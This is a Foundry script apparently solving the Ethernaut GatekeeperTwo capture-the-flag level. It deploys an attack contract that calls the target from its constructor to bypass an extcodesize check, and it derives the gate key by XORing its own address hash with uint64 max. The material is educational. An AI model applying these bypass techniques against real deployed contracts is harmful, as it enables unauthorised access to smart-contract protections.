// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/GatekeeperTwo.s.sol --tc GatekeeperTwoSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract GatekeeperTwoSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("GATEKEEPERTWO_INSTANCE"));

    /*
        - The gateOne can be passed by sending the transaction from a contract created by us like in the telephone level
        - The gateTwo can be passed by sending the tx during the contract creation => extcodesize(caller()) will be 0 during the contract creation
        - The gateThree can be passed by sending the tx from an address whose keccak256 hash of the address XORed with the gateKey is equal to type(uint64).max
        we can get the contract address with address(this) and the keccak256 hash of the address with keccak256(abi.encodePacked(address(this)))
        in order to get the max value in means that every bit is 1. In XOR operation if the bits are the same the result is 0 otherwise it is 1
        so we need to find a key that when XORed with the keccak256 hash of the address will give us the max value
        basically the key should have every bit inverted compared to the keccak256 hash of the address
        this can be done by xorting the keccak256 hash of the address with type(uint64).max
        why ? because the type(uint64).max is 0xFFFFFFFFFFFFFFFF and xorting it with any number will give us the inverted bits of that number
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        GatekeeperTwoAttack attackContract = new GatekeeperTwoAttack(instance);
        console.log("Entrant: ", GatekeeperTwo(instance).entrant());
        vm.stopBroadcast();
    }


}

contract GatekeeperTwoAttack {

    GatekeeperTwo gatekeeperTwoInstance;
    constructor(address _gatekeeperTwoInstance) {
        gatekeeperTwoInstance =  GatekeeperTwo(_gatekeeperTwoInstance);

        // get the gateKey
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this))));
        // get the inverted key
        bytes8 invertedKey = gateKey ^ bytes8(type(uint64).max);

        // call the enter function with the inverted key
        gatekeeperTwoInstance.enter(invertedKey);
    }

}